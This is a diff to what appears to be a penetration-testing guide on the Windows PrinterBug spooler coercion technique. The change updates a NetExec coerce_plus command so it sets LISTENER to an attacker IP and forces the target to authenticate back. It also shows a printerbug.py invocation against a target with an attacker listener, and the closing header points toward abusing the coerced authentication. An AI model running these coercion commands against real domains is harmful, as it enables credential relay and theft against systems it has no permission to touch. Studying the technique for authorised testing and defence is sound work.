@@ -20,8 +20,8 @@ The **PrinterBug** turns the spooler into a coercion engine. Any authenticated u
 printerbug.py 'example.local/user:password'@<target> <attacker-listener>
 # or the original SpoolSample (Windows), or dementor.py
 
-# NetExec can enumerate the spooler and trigger coercion
-nxc smb <target> -u user -p password -M coerce_plus
+# NetExec: without LISTENER it only checks; set LISTENER to actually coerce the callback
+nxc smb <target> -u user -p password -M coerce_plus -o LISTENER=<attacker-ip>
 ```
 
 ## What you do with the coerced auth
